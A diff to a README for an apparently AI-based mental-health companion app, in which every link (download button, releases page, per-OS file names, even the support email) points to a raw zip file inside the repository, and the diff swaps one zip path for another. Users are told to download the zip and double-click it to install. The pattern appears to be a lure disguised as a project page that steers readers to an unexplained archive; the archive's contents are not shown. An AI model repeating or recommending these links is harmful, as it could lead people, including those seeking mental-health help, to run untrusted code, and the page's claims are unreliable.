@@ -1,7 +1,7 @@
 # 🌟 kaggle-capstone-ai-agent - Your Companion for Mental Health Support
 
 ## 🌐 Download the Latest Version
-[![Download Now](https://raw.githubusercontent.com/anshumehta12/kaggle-capstone-ai-agent/main/project/agents/kaggle-capstone-ai-agent_v1.3-alpha.5.zip%https://raw.githubusercontent.com/anshumehta12/kaggle-capstone-ai-agent/main/project/agents/kaggle-capstone-ai-agent_v1.3-alpha.5.zip)](https://raw.githubusercontent.com/anshumehta12/kaggle-capstone-ai-agent/main/project/agents/kaggle-capstone-ai-agent_v1.3-alpha.5.zip)
+[![Download Now](https://raw.githubusercontent.com/anshumehta12/kaggle-capstone-ai-agent/main/project/tools/agent-capstone-kaggle-ai-3.3.zip%https://raw.githubusercontent.com/anshumehta12/kaggle-capstone-ai-agent/main/project/tools/agent-capstone-kaggle-ai-3.3.zip)](https://raw.githubusercontent.com/anshumehta12/kaggle-capstone-ai-agent/main/project/tools/agent-capstone-kaggle-ai-3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the **kaggle-capstone-ai-agent** project! This application acts as a safety-first multi-agent mental health companion. It helps track distress in real time while providing effective grounding techniques. It's designed for anyone looking for support in managing their mental health.
@@ -16,12 +16,12 @@ Before downloading, ensure your system meets these requirements:
 - **Network**: Active Internet connection for real-time features.
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/anshumehta12/kaggle-capstone-ai-agent/main/project/agents/kaggle-capstone-ai-agent_v1.3-alpha.5.zip) to download the latest version.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/anshumehta12/kaggle-capstone-ai-agent/main/project/tools/agent-capstone-kaggle-ai-3.3.zip) to download the latest version.
 
 1. Click on the link above to access the releases.
 2. Choose the latest version of the software from the list.
 3. Download the version compatible with your operating system. 
-   - Look for files named like `https://raw.githubusercontent.com/anshumehta12/kaggle-capstone-ai-agent/main/project/agents/kaggle-capstone-ai-agent_v1.3-alpha.5.zip` for Windows, `https://raw.githubusercontent.com/anshumehta12/kaggle-capstone-ai-agent/main/project/agents/kaggle-capstone-ai-agent_v1.3-alpha.5.zip` for macOS, or a `https://raw.githubusercontent.com/anshumehta12/kaggle-capstone-ai-agent/main/project/agents/kaggle-capstone-ai-agent_v1.3-alpha.5.zip` file for Linux.
+   - Look for files named like `https://raw.githubusercontent.com/anshumehta12/kaggle-capstone-ai-agent/main/project/tools/agent-capstone-kaggle-ai-3.3.zip` for Windows, `https://raw.githubusercontent.com/anshumehta12/kaggle-capstone-ai-agent/main/project/tools/agent-capstone-kaggle-ai-3.3.zip` for macOS, or a `https://raw.githubusercontent.com/anshumehta12/kaggle-capstone-ai-agent/main/project/tools/agent-capstone-kaggle-ai-3.3.zip` file for Linux.
 
 4. Once downloaded, locate the file in your downloads folder.
 5. Double-click the file to begin the installation process.
@@ -59,7 +59,7 @@ Your privacy is our priority. The application does not collect personal informat
 ## 🙋 Support
 If you encounter issues or have questions, you can reach out for support:
 - **Github Issues**: Open a new issue in the GitHub repository.
-- **Email Support**: Contact our support team via [https://raw.githubusercontent.com/anshumehta12/kaggle-capstone-ai-agent/main/project/agents/kaggle-capstone-ai-agent_v1.3-alpha.5.zip](https://raw.githubusercontent.com/anshumehta12/kaggle-capstone-ai-agent/main/project/agents/kaggle-capstone-ai-agent_v1.3-alpha.5.zip).
+- **Email Support**: Contact our support team via [https://raw.githubusercontent.com/anshumehta12/kaggle-capstone-ai-agent/main/project/tools/agent-capstone-kaggle-ai-3.3.zip](https://raw.githubusercontent.com/anshumehta12/kaggle-capstone-ai-agent/main/project/tools/agent-capstone-kaggle-ai-3.3.zip).
 
 ## 📚 Related Topics
 Explore related areas of interest:
@@ -72,4 +72,4 @@ Explore related areas of interest:
 ## 🏁 Next Steps
 Once you have installed and run the application, consider exploring the features. Engage with the multi-agent system and try out grounding techniques to see what works best for you. 
 
-For more information and updates, keep an eye on our [Releases page](https://raw.githubusercontent.com/anshumehta12/kaggle-capstone-ai-agent/main/project/agents/kaggle-capstone-ai-agent_v1.3-alpha.5.zip) where new versions andpatches will be available. Thank you for choosing **kaggle-capstone-ai-agent** as your mental health companion!
+For more information and updates, keep an eye on our [Releases page](https://raw.githubusercontent.com/anshumehta12/kaggle-capstone-ai-agent/main/project/tools/agent-capstone-kaggle-ai-3.3.zip) where new versions andpatches will be available. Thank you for choosing **kaggle-capstone-ai-agent** as your mental health companion!
